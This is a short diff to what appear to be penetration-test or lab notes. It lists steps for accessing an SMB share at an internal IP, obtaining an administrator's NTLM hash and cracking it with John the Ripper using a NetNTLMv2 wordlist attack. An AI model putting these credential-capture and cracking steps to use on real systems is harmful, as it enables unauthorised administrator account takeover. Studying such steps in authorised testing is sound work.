@@ -49,3 +49,7 @@ shell
 powershell
 dir \\192.168.10.50\test
 
+get ntlm hash of administrator
+
+john --format=netntlmv2 --wordlist=wordlist ntlm
+
